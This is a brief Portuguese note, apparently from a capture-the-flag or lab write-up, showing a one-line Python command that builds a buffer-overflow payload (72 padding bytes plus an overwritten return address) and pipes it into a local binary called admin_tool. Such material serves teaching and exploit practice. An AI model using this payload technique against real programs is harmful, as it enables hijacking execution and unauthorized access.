## Utilizando o python para explorar o buffer overflow

python3 -c "import struct; addr = struct.pack('<Q', 0x0000000000401256); offset = b'A' * 72; payload = offset + addr; print(payload.decode('latin-1'))" | ./admin_tool
